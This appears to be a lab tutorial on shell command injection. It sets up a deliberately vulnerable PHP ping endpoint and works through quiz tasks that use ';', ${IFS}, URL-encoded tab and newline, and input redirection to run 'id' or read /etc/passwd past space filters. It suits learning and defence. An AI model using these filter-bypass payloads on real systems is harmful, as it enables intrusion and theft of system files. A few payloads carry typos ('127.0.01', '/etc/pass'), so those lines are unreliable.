# Boundary Reconstruction

## Goal

Learning goals:

- understand that the shell does not automatically infer token boundaries
- distinguish the kinds of boundaries created by `;`, tab, newline, and `${IFS}`
- understand why the debug string and real shell execution may differ
- understand that redirection can change command behavior even without spaces
- reason separately about command boundaries and argument boundaries

---

# Environment

## PHP Mock

```php
<?php
if (isset($_GET["ip"])) {
    $ip = $_GET["ip"];

    $cmd = "ping -c 1 " . $ip;

    echo "[DEBUG] CMD = " . htmlspecialchars($cmd) . "<br>";
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
```

---

## Base Request

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1'
```

---

# Core Concepts

---

# 1. Token Boundary

## Example

```sh
cat/etc/passwd
```

## Important

The shell does not automatically infer:

```text
cat + /etc/passwd
```

So:

```text
cat/etc/passwd
```

it is a single token and is not the same as `cat /etc/passwd`.

---

# 2. Argument Boundary Without Space

## `${IFS}` Expansion

```sh
cat${IFS}/etc/passwd
```

`${IFS}` becomes a field separator during shell expansion, and word splitting happens after that.

## URL-Encoded Tab

```sh
cat%09/etc/passwd
```

Tab can also become an argument separator.

---

# 3. Command Boundary Without Semicolon

## Newline Injection

```sh
127.0.0.1%0aid
```

Newline is closer to:

```text
command terminator
```

rather than an argument separator.

That means:

```bash
ping -c 1 127.0.0.1
id
```

So it can create two separate command flows.

---

# 4. Debug String vs Shell Execution

## Example

```sh
cat${IFS}/etc/passwd
```

Even if `${IFS}` appears literally in debug output, expansion happens first during real shell execution.

## Important

Before execution, the shell performs:

```text
parameter expansion
word splitting
redirection parsing
tokenization
```

again.

---

# 5. Redirection Without argv Reconstruction

## Example

```sh
cat</etc/passwd
```

## Important

Even if `cat /etc/passwd` style argv reconstruction fails without spaces, redirection can still change the data flow and make execution work.

In other words:

```text
argv reconstruction failure
≠
command execution failure
```

`/etc/passwd` becomes a stdin redirection target, not a normal argument.

---

# Useful curl Examples

## Basic Separator

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1;id'
```

## `${IFS}` Bypass

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1;cat${IFS}/etc/passwd'
```

## Tab Separator

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1;cat%09/etc/passwd'
```

## Newline Command Boundary

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1%0aid'
```

## Redirection Read

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1%0acat</etc/passwd'
```

---

# Key Patterns

## Pattern 1 — Token Boundary

```text
the shell does not automatically infer tokens
```

## Pattern 2 — Whitespace Semantics

```text
space
tab
newline
```

do not behave in exactly the same way. Tab can act as an argument separator, while newline can act as a command boundary.

## Pattern 3 — Parser Reinterpretation

The debug string and the real shell result may differ.

## Pattern 4 — Separator Mutation

When one separator is blocked, a different kind of boundary can sometimes replace it.

## Pattern 5 — Redirection Changes Structure

Redirection is not just adding another argument. It changes parser structure.

---

# Mental Model

```text
input
→ URL decode
→ PHP string
→ shell expansion
→ word splitting
→ redirection parsing
→ execution
```

When looking at a separator, always ask:

```text
is this a command boundary?
is this an argument boundary?
is this special syntax?
```

These cases should be separated mentally.

# QA

## Task 1

```text
request: curl 'http://localhost:8000/session04.php?ip=127.0.0.1;id'
```

**Q1.**
What does the final command look like?

<details>
<summary><strong>A1.</strong></summary>

```bash
ping -c 1 127.0.0.1;id
```

</details>

---

**Q2.**
What is the execution flow after shell parsing?

<details>
<summary><strong>A2.</strong></summary>

The shell runs `ping` and then runs `id`.

</details>

---

**Q3.**
Is the output of `id` visible?

<details>
<summary><strong>A3.</strong></summary>

Yes.

</details>

## Task 2

```text
request: curl 'http://localhost:8000/session04.php?ip=127.0.0.1;cat/etc/passwd'
```

**Q1.**
How many tokens does the shell see in `cat/etc/passwd`?

<details>
<summary><strong>A1.</strong></summary>

One token.

</details>

---

**Q2.**
Does it execute as `cat /etc/passwd`?

<details>
<summary><strong>A2.</strong></summary>

No.

</details>

---

**Q3.**
Why does it fail?

<details>
<summary><strong>A3.</strong></summary>

The shell treats the entire string as a command name rather than separating
`cat` from `/etc/passwd`.

</details>

## Task 3

```text
request: curl 'http://localhost:8000/session04.php?ip=127.0.0.1;cat${IFS}/etc/passwd'
```

**Q1.**
What string reaches the shell after URL decoding?

<details>
<summary><strong>A1.</strong></summary>

```bash
ping -c 1 127.0.0.1;cat${IFS}/etc/passwd
```

</details>

---

**Q2.**
At which stage is `${IFS}` processed?

```text
A. URL parser
B. PHP string concatenation
C. shell expansion
```

<details>
<summary><strong>A2.</strong></summary>

C

</details>

---

**Q3.**
Are `cat` and `/etc/passwd` ultimately separated?

<details>
<summary><strong>A3.</strong></summary>

Yes.

</details>

---

**Q4.**
Is the output visible?

<details>
<summary><strong>A4.</strong></summary>

Yes.

</details>

## Task 4

```text
request: curl 'http://localhost:8000/session04.php?ip=127.0.01;cat${IFS}/etc/passwd'
```

**Q1.**
Does the debug command show `${IFS}` literally or as whitespace?

<details>
<summary><strong>A1.</strong></summary>

It shows `${IFS}` literally.

</details>

---

**Q2.**
Does the actual execution succeed?

<details>
<summary><strong>A2.</strong></summary>

Yes.

</details>

---

**Q3.**
Why can the debug command differ from the observed shell behavior?

<details>
<summary><strong>A3.</strong></summary>

The debug output shows the pre-expansion string. Before execution, the shell
performs parameter expansion and word splitting, producing
`cat /etc/passwd`.

</details>

## Task 5

```text
goal: execute id
restriction: space
allowed: semicolon, tab, newline, ${IFS}
```

**Q1.**
Does the shell treat a tab as a separator?

<details>
<summary><strong>A1.</strong></summary>

Yes, it can act as an argument separator.

</details>

---

**Q2.**
How can a tab be placed in a URL?

<details>
<summary><strong>A2.</strong></summary>

Use URL encoding, such as `%09`.

</details>

---

**Q3.**
Can a separator be created without `${IFS}`?

<details>
<summary><strong>A3.</strong></summary>

Yes. A URL-encoded tab can create an argument boundary.

</details>

## Task 5-1

```text
goal: cat /etc/passwd
restrictions: space, ${IFS}
allowed: tab
```

**Q1.**
What is the URL-encoded tab between `cat` and `/etc/passwd`?

<details>
<summary><strong>A1.</strong></summary>

%09

</details>

---

**Q2.**
What is the complete curl request?

<details>
<summary><strong>A2.</strong></summary>

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1;cat%09/etc/passwd'
```

</details>

---

**Q3.**
What might the debug command show after URL decoding?

<details>
<summary><strong>A3.</strong></summary>

```bash
ping -c 1 127.0.0.1;cat	/etc/passwd
```

</details>

## Task 5-2

```text
payload: curl 'http://localhost:8000/session04.php?ip=127.0.01;cat%09/etc/passwd'
```

**Q1.**
How many tokens result from `cat<TAB>/etc/passwd`?

<details>
<summary><strong>A1.</strong></summary>

Two: `cat` and `/etc/passwd`.

</details>

---

**Q2.**
What is the command flow?

<details>
<summary><strong>A2.</strong></summary>

```text
ping -c 1 127.0.0.1 -> cat /etc/passwd
```

</details>

---

**Q3.**
Is the output visible?

<details>
<summary><strong>A3.</strong></summary>

Yes.

</details>

## Task 6

```text
goal: cat /etc/passwd
restrictions: space, tab, ${IFS}
allow: newline
```

```text
payload: curl 'http://localhost:8000/session04.php?ip=127.0.01%0acat</etc/pass'
```

**Q1.**
Can a newline act as a command separator?

<details>
<summary><strong>A1.</strong></summary>

Yes. It can terminate a command, but it does not form an argument boundary
within the same command.

</details>

---

**Q2.**
What is the difference between these inputs?

```text
A)
cat%0a/etc/passwd

B)
cat%0aid
```

<details>
<summary><strong>A2.</strong></summary>

In `A`, `cat` runs without a file argument and `/etc/passwd` is interpreted
as a separate command. In `B`, `cat` runs without input and `id` runs as the
next command.

</details>

## Task 6-1

**Q1.**
Can a newline alone create the argument boundary in `cat /etc/passwd`?

<details>
<summary><strong>A1.</strong></summary>

No.

</details>

---

**Q2.**
How can newline still help under these restrictions?

<details>
<summary><strong>A2.</strong></summary>

It can begin a new command, which can then use redirection.

</details>

---

**Q3.**
What alternative command form reads `/etc/passwd` without an argument separator?

<details>
<summary><strong>A3.</strong></summary>

```bash
cat</etc/passwd
```

</details>

## Task 6-2

```text
payload: curl 'http://localhost:8000/session04.php?ip=127.0.0.1%0acat</etc/passwd'
```

**Q1.**
How many commands does the shell see?

<details>
<summary><strong>A1.</strong></summary>

Two.

</details>

---

**Q2.**
How many `argv` entries does the second command have?

<details>
<summary><strong>A2.</strong></summary>

One: the command name `cat`.

</details>

---

**Q3.**
Is `/etc/passwd` an argument or a stdin source?

<details>
<summary><strong>A3.</strong></summary>

It is the stdin redirection target.

</details>

---

**Q4.**
Is the output visible?

<details>
<summary><strong>A4.</strong></summary>

Yes.

</details>

## Task 7

```text
goal: id
restrictions: space, tab, ${IFS}, semicolon
allow: newline
```

**Q1.**
What can start a second command without a semicolon?

<details>
<summary><strong>A1.</strong></summary>

A newline (`%0A`).

</details>

---

**Q2.**
What replaces `????` in `127.0.0.1????id`?

<details>
<summary><strong>A2.</strong></summary>

`%0A`.

</details>

---

**Q3.**
What is the complete curl request?

<details>
<summary><strong>A3.</strong></summary>

```bash
curl 'http://localhost:8000/session04.php?ip=127.0.0.1%0Aid'
```

</details>

## Task 7-1

```text
payload: curl 'http://localhost:8000/session04.php?ip=127.0.0.1%0Aid'
```

**Q1.**
How many lines are in the final shell command?

<details>
<summary><strong>A1.</strong></summary>

Two.

</details>

---

**Q2.**
Which command is on the first line?

<details>
<summary><strong>A2.</strong></summary>

`ping`.

</details>

---

**Q3.**
Which command is on the second line?

<details>
<summary><strong>A3.</strong></summary>

`id`.

</details>

---

**Q4.**
Why is execution separated without a semicolon?

<details>
<summary><strong>A4.</strong></summary>

URL decoding turns `%0A` into a newline, which terminates the first command.

</details>

The key point is:

```text
the shell interprets newline as a command terminator
```

Therefore:

```bash
ping -c 1 127.0.0.1
id
```

creates a boundary similar to:

```bash
ping -c 1 127.0.0.1 ; id
```

## Pattern Extraction

Summarize the session's core patterns.

## Pattern 1 — Token Boundary

```text
the shell does not infer token boundaries automatically
```

For example:

```bash
cat/etc/passwd
```

↓

```text
1 token
```

is one token, not:

```text
cat + /etc/passwd
```

## Pattern 2 — Whitespace Semantics

These whitespace characters can affect shell boundaries:

```text
space
tab
newline
```

They can be introduced through URL encoding:

```text
tab  -> %09
newline -> %0a
```

## Pattern 3 — Parser Reinterpretation

The debug string and actual execution can differ because the shell performs:

```text
parameter expansion
word splitting
redirection parsing
tokenization
```

before execution. Example:

```bash
cat${IFS}/etc/passwd
```

↓

```bash
cat /etc/passwd
```


## Pattern 4 — Boundary Substitution

Different syntax can create different boundaries:

```text
;        -> command boundary
newline  -> command boundary
tab      -> argument boundary
${IFS}   -> triggers word splitting
```

## Pattern 5 — Execution Without Argument Reconstruction

Without spaces:

```bash
cat</etc/passwd
```

redirection can still alter data flow. Therefore:

```text
argument reconstruction failure
!=
command execution failure
```


## Final Reflection

**Q1.**
What was the most important parser behavior in this session?

<details>
<summary><strong>A1.</strong></summary>

The shell reinterprets the command string and creates argument or command
boundaries according to syntax.

</details>

---

**Q2.**
How do `${IFS}` and `%0A` differ?

<details>
<summary><strong>A2.</strong></summary>

`${IFS}` can trigger word splitting and create an argument boundary. `%0A`
decodes to newline and creates a command boundary.

</details>

---

**Q3.**
Why is blocking spaces alone insufficient against command injection?

<details>
<summary><strong>A3.</strong></summary>

Other shell syntax, including `${IFS}`, tabs, newlines, and redirection, can
create the required boundaries.

</details>
